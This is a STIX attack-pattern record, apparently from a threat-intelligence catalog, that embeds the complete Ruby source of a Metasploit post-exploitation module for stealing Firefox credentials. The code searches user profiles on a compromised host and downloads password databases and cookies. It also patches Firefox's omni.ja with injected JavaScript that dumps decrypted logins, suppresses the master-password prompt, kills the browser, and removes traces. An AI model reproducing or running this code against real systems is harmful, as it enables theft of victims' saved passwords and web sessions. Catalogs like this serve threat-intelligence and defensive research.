{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5843b71c-6f75-4d44-b287-5ff37cad68c8",
    "created": "2024-08-14T16:33:19.166757Z",
    "modified": "2024-08-14T16:33:19.166761Z",
    "name": "Multi Gather Firefox Signon Credential Collection",
    "description": " This module will collect credentials from the Firefox web browser if it is installed on the targeted machine. Additionally, cookies are downloaded. Which could potentially yield valid web sessions.  Firefox stores passwords within the signons.sqlite database file. There is also a keys3.db file which contains the key for decrypting these passwords. In cases where a Master Password has not been set, the passwords can easily be decrypted using 3rd party tools or by setting the DECRYPT option to true. Using the latter often needs root privileges. Also be warned that if your session dies in the middle of the file renaming process, this could leave Firefox in a non working state. If a Master Password was used the only option would be to bruteforce.  Useful 3rd party tools: + firefox_decrypt (https://github.com/Unode/firefox_decrypt) + pswRecovery4Moz (https://github.com/philsmd/pswRecovery4Moz)  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/firefox_creds.rb",
            "external_id": "firefox_creds.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n#\n# Standard Library\n#\nrequire 'tmpdir'\n\n#\n# Gems\n#\nrequire 'zip'\n\n#\n# Project\n#\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::File\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::UserProfiles\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Gather Firefox Signon Credential Collection',\n        'Description' => %q{\n          This module will collect credentials from the Firefox web browser if it is\n          installed on the targeted machine. Additionally, cookies are downloaded. Which\n          could potentially yield valid web sessions.\n\n          Firefox stores passwords within the signons.sqlite database file. There is also a\n          keys3.db file which contains the key for decrypting these passwords. In cases where\n          a Master Password has not been set, the passwords can easily be decrypted using\n          3rd party tools or by setting the DECRYPT option to true. Using the latter often\n          needs root privileges. Also be warned that if your session dies in the middle of the\n          file renaming process, this could leave Firefox in a non working state. If a\n          Master Password was used the only option would be to bruteforce.\n\n          Useful 3rd party tools:\n          + firefox_decrypt (https://github.com/Unode/firefox_decrypt)\n          + pswRecovery4Moz (https://github.com/philsmd/pswRecovery4Moz)\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'bannedit',\n          'xard4s', # added decryption support\n          'g0tmi1k' # @g0tmi1k // https://blog.g0tmi1k.com/ - additional features\n        ],\n        'Platform' => %w[bsd linux osx unix win],\n        'SessionTypes' => ['meterpreter', 'shell' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_close\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_tell\n              core_channel_write\n              stdapi_fs_stat\n              stdapi_sys_config_getenv\n              stdapi_sys_config_getuid\n              stdapi_sys_process_get_processes\n              stdapi_sys_process_kill\n            ]\n          }\n        }\n      )\n    )\n\n    register_options([\n      OptBool.new('DECRYPT', [false, 'Decrypts passwords without third party tools', false])\n    ])\n\n    register_advanced_options([\n      OptInt.new('DOWNLOAD_TIMEOUT', [true, 'Timeout to wait when downloading files through shell sessions', 20]),\n      OptBool.new('DISCLAIMER', [false, 'Acknowledge the DECRYPT warning', false]),\n      OptBool.new('RECOVER', [false, 'Attempt to recover from bad DECRYPT when possible', false])\n    ])\n  end\n\n  def run\n    # Certain shells for certain platform\n    vprint_status('Determining session platform and type')\n    case session.platform\n    when 'unix', 'linux', 'bsd'\n      @platform = :unix\n    when 'osx'\n      @platform = :osx\n    when 'windows'\n      if session.type != 'meterpreter'\n        print_error 'Only meterpreter sessions are supported on Windows hosts'\n        return\n      end\n      @platform = :windows\n    else\n      print_error(\"Unsupported platform: #{session.platform}\")\n      return\n    end\n\n    if datastore['DECRYPT']\n      do_decrypt\n    else # Non DECRYPT\n      paths = enum_users\n\n      if paths.nil? || paths.empty?\n        print_error('No users found with a Firefox directory')\n        return\n      end\n\n      download_loot(paths.flatten)\n    end\n  end\n\n  def do_decrypt\n    unless datastore['DISCLAIMER']\n      decrypt_disclaimer\n      return\n    end\n\n    omnija = nil             # non meterpreter download\n    org_file = 'omni.ja'     # key file\n    new_file = Rex::Text.rand_text_alpha(rand(5..7)) + '.ja'\n    temp_file = 'orgomni.ja' # backup of key file\n\n    # Sets @paths\n    return unless decrypt_get_env\n\n    # Check target for the necessary files\n    if session.type == 'meterpreter'\n      if session.fs.file.exist?(@paths['ff'] + temp_file) && !session.fs.file.exist?(@paths['ff'] + org_file)\n        print_error(\"Detected #{temp_file} without #{org_file}. This is a good sign of previous DECRYPT attack gone wrong.\")\n        return\n      elsif session.fs.file.exist?(@paths['ff'] + temp_file)\n        decrypt_file_stats(temp_file, org_file, @paths['ff'])\n        if datastore['RECOVER']\n          return unless decrypt_recover_omni(temp_file, org_file)\n        else\n          print_warning('If you wish to continue by trying to recover, set the advanced option, RECOVER, to TRUE.')\n          return\n        end\n      elsif !session.fs.file.exist?(@paths['ff'] + org_file)\n        print_error(\"Could not download #{org_file}. File does not exist.\")\n        return\n      end\n    end\n\n    session.type == 'meterpreter' ? (size = format('(%s MB)', '%0.2f') % (session.fs.file.stat(@paths['ff'] + org_file).size / 1048576.0)) : (size = '')\n    tmp = Dir.tmpdir + '/' + new_file # Cross platform local tempdir, \"/\" should work on Windows too\n    print_status(\"Downloading #{@paths['ff'] + org_file} to: #{tmp} %s\" % size)\n\n    if session.type == 'meterpreter'            # If meterpreter is an option, lets use it!\n      session.fs.file.download_file(tmp, @paths['ff'] + org_file)\n    else                                        # Fall back shells\n      omnija = read_file(@paths['ff'] + org_file)\n      if omnija.nil? || omnija.empty? || omnija =~ (/No such file/i)\n        print_error(\"Could not download: #{@paths['ff'] + org_file}\")\n        print_error(\"Tip: Try switching to a meterpreter shell if possible (as it's more reliable/stable when downloading)\") if session.type != 'meterpreter'\n        return\n      end\n\n      print_status(\"Saving #{org_file} to: #{tmp}\")\n      file_local_write(tmp, omnija)\n    end\n\n    res = nil\n    print_status(\"Injecting into: #{tmp}\")\n    begin\n      # Automatically commits the changes made to the zip archive when the block terminates\n      Zip::File.open(tmp) do |zip_file|\n        res = decrypt_modify_omnija(zip_file)\n      end\n    rescue Zip::Error\n      print_error(\"Error modifying: #{tmp}\")\n      return\n    end\n\n    if res\n      vprint_good(\"Successfully modified: #{tmp}\")\n    else\n      print_error('Failed to inject')\n      return\n    end\n\n    print_status(\"Uploading #{tmp} to: #{@paths['ff'] + new_file}\")\n    print_warning('This may take some time...') if %i[unix osx].include?(@platform)\n\n    if session.type == 'meterpreter'\n      session.fs.file.upload_file(@paths['ff'] + new_file, tmp)\n    else\n      unless upload_file(@paths['ff'] + new_file, tmp)\n        print_error(\"Could not upload: #{tmp}\")\n        return\n      end\n    end\n\n    return unless decrypt_trigger_decrypt(org_file, new_file, temp_file)\n\n    decrypt_download_creds\n  end\n\n  def decrypt_disclaimer\n    print_line\n    print_warning('Decrypting the keys causes the remote Firefox process to be killed.')\n    print_warning('If the user is paying attention, this could make them suspicious.')\n    print_warning('In order to proceed, set the advanced option, DISCLAIMER, to TRUE.')\n    print_line\n  end\n\n  def decrypt_file_stats(temp_file, org_file, _path)\n    print_line\n    print_error(\"Detected #{temp_file} already on the target. This could possible a possible backup of the original #{org_file} from a bad DECRYPT attack.\")\n    print_status(\"Size: #{session.fs.file.stat(@paths['ff'] + org_file).size}B (#{org_file})\")\n    print_status(\"Size: #{session.fs.file.stat(@paths['ff'] + temp_file).size}B (#{temp_file})\")\n    print_status(\"#{org_file}   : Created- #{session.fs.file.stat(@paths['ff'] + org_file).ctime}  Modified- #{session.fs.file.stat(@paths['ff'] + org_file).mtime}  Accessed- #{session.fs.file.stat(@paths['ff'] + org_file).mtime}\")\n    print_status(\"#{temp_file}: Created- #{session.fs.file.stat(@paths['ff'] + temp_file).ctime}  Modified- #{session.fs.file.stat(@paths['ff'] + temp_file).mtime}  Accessed- #{session.fs.file.stat(@paths['ff'] + temp_file).ctime}\")\n    print_line\n  end\n\n  def decrypt_recover_omni(temp_file, org_file)\n    print_status(\"Restoring: #{@paths['ff'] + temp_file} (Possible backup)\")\n    file_rm(@paths['ff'] + org_file)\n    rename_file(@paths['ff'] + temp_file, @paths['ff'] + org_file)\n\n    if session.type == 'meterpreter'\n      print_error(\"There is still #{temp_file} on the target. Something went wrong.\") if session.fs.file.exist?(@paths['ff'] + temp_file)\n\n      unless session.fs.file.exist?(@paths['ff'] + org_file)\n        print_error(\"#{org_file} is no longer at #{@paths['ff'] + org_file}\")\n        return false\n      end\n    end\n\n    true\n  end\n\n  def enum_users\n    paths = []\n    id = whoami\n\n    if id.nil? || id.empty?\n      print_error(\"Session #{datastore['SESSION']} is not responding\")\n      return\n    end\n\n    if @platform == :windows\n      vprint_status('Searching every possible account on the target system')\n      grab_user_profiles.each do |user|\n        next if user['AppData'].nil?\n\n        dir = check_firefox_win(user['AppData'])\n        paths << dir if dir\n      end\n    else # unix, bsd, linux, osx\n      @platform == :osx ? (home = '/Users/') : (home = '/home/')\n\n      if got_root\n        vprint_status('Detected ROOT privileges. Searching every account on the target system.')\n        userdirs = \"/root\\n\"\n        userdirs << cmd_exec(\"find #{home} -maxdepth 1 -mindepth 1 -type d 2>/dev/null\")\n      else\n        vprint_status(\"Checking #{id}'s Firefox account\")\n        userdirs = \"#{home + id}\\n\"\n      end\n\n      userdirs.each_line do |dir|\n        dir.chomp!\n        next if (dir == '.') || (dir == '..') || dir =~ (/No such file/i)\n\n        @platform == :osx ? (basepath = \"#{dir}/Library/Application Support/Firefox/Profiles\") : (basepath = \"#{dir}/.mozilla/firefox\")\n\n        print_status(\"Checking for Firefox profile in: #{basepath}\")\n        checkpath = cmd_exec('find ' + basepath.gsub(/ /, '\\\\ ') + ' -maxdepth 1 -mindepth 1 -type d 2>/dev/null')\n\n        checkpath.each_line do |ffpath|\n          ffpath.chomp!\n          if ffpath =~ /\\.default(?:-release)?$/\n            vprint_good(\"Found profile: #{ffpath}\")\n            paths << ffpath.to_s\n          end\n        end\n      end\n    end\n    return paths\n  end\n\n  def check_firefox_win(path)\n    paths = []\n    ffpath = []\n    path += '\\\\Mozilla\\\\'\n    print_status(\"Checking for Firefox profile in: #{path}\")\n\n    stat = begin\n      session.fs.file.stat(path + 'Firefox\\\\profiles.ini')\n    rescue StandardError\n      nil\n    end\n    if !stat\n      print_error('Firefox was not found (Missing profiles.ini)')\n      return\n    end\n\n    session.fs.dir.foreach(path) do |fdir|\n      # print_status(\"Found a Firefox directory: #{path + fdir}\")\n      ffpath << path + fdir\n      break\n    end\n\n    if ffpath.empty?\n      print_error('Firefox was not found')\n      return\n    end\n\n    # print_status(\"Locating Firefox profiles\")\n    path << 'Firefox\\\\Profiles\\\\'\n\n    # We should only have profiles in the Profiles directory store them all\n    begin\n      session.fs.dir.foreach(path) do |pdirs|\n        next if (pdirs == '.') || (pdirs == '..')\n\n        vprint_good(\"Found profile: #{path + pdirs}\")\n        paths << path + pdirs\n      end\n    rescue StandardError\n      print_error('Profiles directory is missing')\n      return\n    end\n\n    paths.empty? ? nil : paths\n  end\n\n  def download_loot(paths)\n    loot = ''\n    print_line\n\n    paths.each do |path|\n      print_status(\"Profile: #{path}\")\n\n      #   win: C:\\Users\\administrator\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\tsnwjx4g.default\n      # linux: /root/.mozilla/firefox/tsnwjx4g.default         (iceweasel)\n      #   osx: /Users/mbp/Library/Application Support/Firefox/Profiles/tsnwjx4g.default\n      profile = path.scan(%r{Profiles[\\\\|/](.+)\\.(.+)$}).flatten[0].to_s\n      profile = path.scan(%r{firefox[\\\\|/](.+)\\.(.+)$}).flatten[0].to_s if profile.empty?\n\n      session.type == 'meterpreter' ? (files = session.fs.dir.foreach(path)) : (files = cmd_exec('find ' + path.gsub(/ /, '\\\\ ') + ' -maxdepth 1 -mindepth 1 -type f 2>/dev/null').gsub(%r{.*/}, '').split(\"\\n\"))\n\n      files.each do |file|\n        file.chomp!\n        next unless file =~ (/^key\\d\\.db$/) || file =~ (/^cert\\d\\.db$/) || file =~ (/^signons.sqlite$/i) || file =~ (/^cookies\\.sqlite$/) || file =~ (/^logins\\.json$/)\n\n        ext = file.split('.')[2]\n        ext == 'txt' ? (mime = 'plain') : (mime = 'binary')\n        vprint_status(\"Downloading: #{file}\")\n        if @platform == :windows\n          p = store_loot(\"ff.#{profile}.#{file}\", \"#{mime}/#{ext}\", session, \"firefox_#{file}\")\n          session.fs.file.download_file(p, path + '\\\\' + file)\n          print_good(\"Downloaded #{file}: #{p}\")\n        else # windows has to be meterpreter, so can be anything else (unix, bsd, linux, osx)\n          loot = cmd_exec(\"cat #{path}//#{file}\", nil, datastore['DOWNLOAD_TIMEOUT'])\n          if loot.nil? || loot.empty?\n            print_error(\"Failed to download #{file}, if the file is very long, try increasing DOWNLOAD_TIMEOUT\")\n          else\n            p = store_loot(\"ff.#{profile}.#{file}\", \"#{mime}/#{ext}\", session, loot, \"firefox_#{file}\", \"#{file} for #{profile}\")\n            print_good(\"Downloaded #{file}: #{p}\")\n          end\n        end\n      end\n      print_line\n    end\n  end\n\n  # Checks for needed privileges and if Firefox is installed\n  def decrypt_get_env\n    @paths = {}\n    check_paths = []\n    loot_file = Rex::Text.rand_text_alpha(6) + '.txt'\n\n    case @platform\n    when :windows\n      version = get_version_info\n      unless got_root || version.xp_or_2003?\n        print_warning('You may need SYSTEM privileges on this platform for the DECRYPT option to work')\n      end\n\n      env_vars = session.sys.config.getenvs('TEMP', 'SystemDrive')\n      tmpdir = env_vars['TEMP'] + '\\\\'\n      drive = env_vars['SystemDrive']\n\n      # This way allows for more independent use of meterpreter payload (32 and 64 bit) and cleaner code\n      check_paths << drive + '\\\\Program Files\\\\Mozilla Firefox\\\\'\n      check_paths << drive + '\\\\Program Files (x86)\\\\Mozilla Firefox\\\\'\n    when :unix\n      unless got_root\n        print_error('You need ROOT privileges on this platform for DECRYPT option')\n        return false\n      end\n      # Unix matches linux|unix|bsd but BSD is not supported\n      if session.platform =~ /bsd/\n        print_error('Sorry, BSD is not supported by the DECRYPT option')\n        return false\n      end\n\n      tmpdir = '/tmp/'\n\n      check_paths << '/usr/lib/firefox/'\n      check_paths << '/usr/lib64/firefox/'\n      check_paths << '/usr/lib/iceweasel/'\n      check_paths << '/usr/lib64/iceweasel/'\n    when :osx\n      tmpdir = '/tmp/'\n      check_paths << '/applications/firefox.app/contents/macos/'\n    end\n\n    @paths['ff'] = check_paths.find do |p|\n      check = p.sub(%r{(\\\\|/)(mozilla\\s)?firefox.*}i, '')\n      vprint_status(\"Checking for Firefox directory in: #{check}\")\n      if directory?(p.sub(%r{(\\\\|/)$}, ''))\n        print_good(\"Found Firefox directory: #{check}\")\n        true\n      else\n        false\n      end\n    end\n\n    if @paths['ff'].nil?\n      print_error('No Firefox directory found')\n      return false\n    end\n\n    @paths['loot'] = tmpdir + loot_file\n\n    true\n  end\n\n  def decrypt_modify_omnija(zip)\n    # Which files to extract from ja/zip\n    files = [\n      'components/storage-mozStorage.js',                        # stor_js\n      'chrome/toolkit/content/passwordmgr/passwordManager.xul',  # pwd_xul\n      'chrome/toolkit/content/global/commonDialog.xul',          # dlog_xul\n      'jsloader/resource/gre/components/storage-mozStorage.js'   # res_js (not 100% sure why this is used)\n    ]\n\n    # Extract files from zip\n    arya = files.map do |omnija_file|\n      fdata = {}\n      begin\n        fdata['content'] = zip.read(omnija_file) unless omnija_file =~ /jsloader/\n        fdata['outs'] = zip.get_output_stream(omnija_file)\n      rescue StandardError\n        print_error(\"Was not able to find '#{omnija_file}' in the compressed .JA file\")\n        print_error('This could be due to a corrupt download or a unsupported Firefox/Iceweasel version')\n        return false\n      end\n      fdata\n    end\n\n    # Read contents of array (arya)\n    stor_js, pwd_xul, dlog_xul, res_js = arya\n    stor_js['outs_res'] = res_js['outs']\n\n    # Insert payload (close after starting up - allowing evil js to run and nothing else)\n    wnd_close = 'window.close();'\n    onload = \"Startup(); SignonsStartup(); #{wnd_close}\"\n\n    # Patch commonDialog.xul - Get rid of (possible) master password prompt\n    dlog_xul['content'].sub!(/commonDialogOnLoad\\(\\);/, wnd_close)\n    dlog_xul['outs'].write(dlog_xul['content'])\n    dlog_xul['outs'].close\n    vprint_good('[1/2] XUL injected - commonDialog.xul')\n\n    # Patch passwordManager.xul - Close password manager immediately\n    pwd_xul['content'].sub!(/Startup\\(\\); SignonsStartup\\(\\);/, onload)\n    pwd_xul['outs'].write(pwd_xul['content'])\n    pwd_xul['outs'].close\n    vprint_good('[2/2] XUL injected - passwordManager.xul')\n\n    # Patch ./components/storage-mozStorage.js - returns true or false\n    return decrypt_patch_method(stor_js)\n  end\n\n  # Patches getAllLogins() methods in ./components/storage-mozStorage.js\n  def decrypt_patch_method(stor_js)\n    data = ''\n    # Imports needed for IO\n    imports = %|Components.utils.import(\"resource://gre/modules/NetUtil.jsm\");\nComponents.utils.import(\"resource://gre/modules/FileUtils.jsm\");\nComponents.utils.import(\"resource://gre/modules/XPCOMUtils.jsm\");\n|\n\n    # Javascript code to intercept the logins array and write the credentials to a file\n    method_epilog = %|\n        var data = \"\";\n        var path = \"#{@paths['loot'].inspect.gsub(/\"/, '')}\";\n        var file = new FileUtils.File(path);\n\n        var outstream = FileUtils.openSafeFileOutputStream(file);\n        var converter = Components.classes[\"@mozilla.org/intl/scriptableunicodeconverter\"].\n          createInstance(Components.interfaces.nsIScriptableUnicodeConverter);\n        converter.charset = \"UTF-8\";\n\n        if (logins.length != 0) {\n          for (var i = 0; i < logins.length; i++) {\n            data += logins[i].hostname + \" :: \" + logins[i].username + \" :: \" + logins[i].password + \" ^\";\n          }\n        } else {\n          data = \"no creds\";\n        }\n\n        var istream = converter.convertToInputStream(data);\n        NetUtil.asyncCopy(istream, outstream);\n\n        return logins;\n|\n\n    regex = [\n      nil, # dirty hack alert\n      [/return\\slogins;/, method_epilog],\n      [%r{Components\\.utils\\.import\\(\"resource://gre/modules/XPCOMUtils\\.jsm\"\\);}, imports]\n    ]\n\n    # Match the last two regular expressions\n    i = 2 # ...this is todo with the nil in the above regex array & regex command below\n    x = i\n    stor_js['content'].each_line do |line|\n      # There is no real substitution if the matching regex has no corresponding patch code\n      if i != 0 && line.sub!(regex[i][0]) do |_match|\n        if regex[i][1]\n          vprint_good(\"[#{x - i + 1}/#{x}] Javascript injected - ./components/storage-mozStorage.js\")\n          regex[i][1]\n        end\n      end\n        i -= 1\n      end\n      data << line\n    end\n\n    # Write the same data to both output streams\n    stor_js['outs'].write(data)\n    stor_js['outs_res'].write(data)\n    stor_js['outs'].close\n    stor_js['outs_res'].close\n\n    i == 0\n  end\n\n  # Starts a new Firefox process and triggers decryption\n  def decrypt_trigger_decrypt(org_file, new_file, temp_file)\n    [org_file, new_file, temp_file].each do |f|\n      f.insert(0, @paths['ff'])\n    end\n\n    # Firefox command line arguments\n    args = '-purgecaches -chrome chrome://passwordmgr/content/passwordManager.xul'\n\n    # In case of unix-like platform Firefox needs to start under user context\n    case @platform\n    when :unix\n      # Assuming userdir /home/(x) = user\n      print_status('Enumerating users')\n      homedirs = cmd_exec('find /home -maxdepth 1 -mindepth 1 -type d 2>/dev/null').gsub(%r{.*/}, '')\n      if homedirs.nil? || homedirs.empty?\n        print_error('No normal user found')\n        return false\n      end\n      user = nil\n      # Skip home directories which contain a space, as those are likely not usernames...\n      homedirs.each_line do |homedir|\n        user = homedir.chomp\n        break unless user.index(' ')\n      end\n\n      # Since we can't access the display environment variable we have to assume the default value\n      args.insert(0, \"\\\"#{@paths['ff']}firefox --display=:0 \")\n      args << '\"'\n      cmd = \"su #{user} -c\"\n    when :windows, :osx\n      cmd = @paths['ff'] + 'firefox'\n      # On OSX, run in background\n      args << '& sleep 5 && killall firefox' if @platform == :osx\n    end\n\n    # Check if Firefox is running and kill it\n    if session.type == 'meterpreter'\n      session.sys.process.each_process do |p|\n        next unless p['name'] =~ /firefox\\.exe/\n\n        print_status('Found running Firefox process, attempting to kill.')\n        unless session.sys.process.kill(p['pid'])\n          print_error('Could not kill Firefox process')\n          return false\n        end\n      end\n    else # windows has to be meterpreter, so can be anything else (unix, bsd, linux, osx)\n      p = cmd_exec('ps', 'cax | grep firefox')\n      if p =~ /firefox/\n        print_status('Found running Firefox process, attempting to kill.')\n        term = cmd_exec('killall', 'firefox && echo true')\n        if term !~ /true/\n          print_error('Could not kill Firefox process')\n          return false\n        end\n      end\n    end\n    sleep(1)\n\n    #\n    # Rename-fu:\n    #   omni.ja (original) -> orgomni.ja (original_backup)\n    #   *random*.ja (evil) -> omni.ja (original)\n    #   ...start & close Firefox...\n    #   omni.ja (evil)               -> *random*.ja (pointless temp file)\n    #   orgomni.ja (original_backup) -> omni.ja (original)\n    #\n    vprint_status('Renaming .JA files')\n    rename_file(org_file, temp_file)\n    rename_file(new_file, org_file)\n\n    # Automatic termination (window.close() - injected XUL or firefox cmd arguments)\n    print_status(\"Starting Firefox process to get #{whoami}'s credentials\")\n    cmd_exec(cmd, args)\n    sleep(1)\n\n    # Lets just check theres something before going forward\n    if session.type == 'meterpreter'\n      i = 20\n      vprint_status(\"Waiting up to #{i} seconds for loot file (#{@paths['loot']}) to be generated\") unless session.fs.file.exist?(@paths['loot'])\n      until session.fs.file.exist?(@paths['loot'])\n        sleep 1\n        i -= 1\n        break if i == 0\n      end\n      print_error('Missing loot file. Something went wrong.') unless session.fs.file.exist?(@paths['loot'])\n    end\n\n    print_status(\"Restoring original .JA: #{temp_file}\")\n    rename_file(org_file, new_file)\n    rename_file(temp_file, org_file)\n\n    # Clean up\n    vprint_status(\"Cleaning up: #{new_file}\")\n    file_rm(new_file)\n    if session.type == 'meterpreter'\n      if session.fs.file.exist?(temp_file)\n        print_error(\"Detected backup file (#{temp_file}) still on the target. Something went wrong.\")\n      end\n      unless session.fs.file.exist?(org_file)\n        print_error(\"Unable to find #{org_file} on target. Something went wrong.\")\n      end\n    end\n\n    # At this time, there should have a loot file\n    if session.type == 'meterpreter' && !session.fs.file.exist?(@paths['loot'])\n      print_error('DECRYPT failed. Either something went wrong (download/upload? Injecting?), there is a master password or an unsupported Firefox version.')\n      # Another issue is encoding. The files may be seen as 'data' rather than 'ascii'\n      print_error('Tip: Try swtiching to a meterpreter shell if possible (as its more reliable/stable when downloading/uploading)') if session.type != 'meterpreter'\n      return false\n    end\n\n    true\n  end\n\n  def decrypt_download_creds\n    print_good(\"Downloading loot: #{@paths['loot']}\")\n    loot = read_file(@paths['loot'])\n\n    if loot =~ /no creds/\n      print_status('No Firefox credentials where found')\n      return\n    end\n\n    # Better delete the remote creds file\n    vprint_status(\"Cleaning up: #{@paths['loot']}\")\n    file_rm(@paths['loot'])\n\n    # Create table to store\n    cred_table = Rex::Text::Table.new(\n      'Header' => 'Firefox Credentials',\n      'Indent' => 1,\n      'Columns' =>\n        [\n          'Hostname',\n          'User',\n          'Password'\n        ]\n    )\n\n    creds = loot.split('^')\n    creds.each do |cred|\n      hostname, user, pass = cred.rstrip.split(' :: ')\n      cred_table << [hostname, user, pass]\n\n      # Creds API\n      service_data = {\n        workspace_id: myworkspace_id\n      }\n\n      credential_data = {\n        origin_type: :session,\n        session_id: session_db_id,\n        post_reference_name: refname,\n        smodule_fullname: fullname,\n        username: user,\n        private_data: pass,\n        private_type: :password\n      }.merge(service_data)\n\n      create_credential(credential_data)\n    end\n\n    # Create local loot csv file\n    path = store_loot(\n      'firefox.creds',\n      'text/plain',\n      session,\n      cred_table.to_csv,\n      'firefox_credentials.txt',\n      'Firefox Credentials'\n    )\n    vprint_good(\"Saved loot: #{path}\")\n\n    # Display out\n    vprint_line(\"\\n\" + cred_table.to_s)\n  end\n\n  def got_root\n    case @platform\n    when :windows\n      session.sys.config.getuid =~ /SYSTEM/ ? true : false\n    else # unix, bsd, linux, osx\n      id_output = cmd_exec('id').chomp\n      if id_output.blank?\n        # try an absolute path\n        id_output = cmd_exec('/usr/bin/id').chomp\n      end\n      id_output.include?('uid=0(') ? true : false\n    end\n  end\n\n  def whoami\n    if @platform == :windows\n      id = session.sys.config.getenv('USERNAME')\n    else\n      id = cmd_exec('id -un')\n    end\n\n    id\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[bsd linux osx unix win]"
    ]
}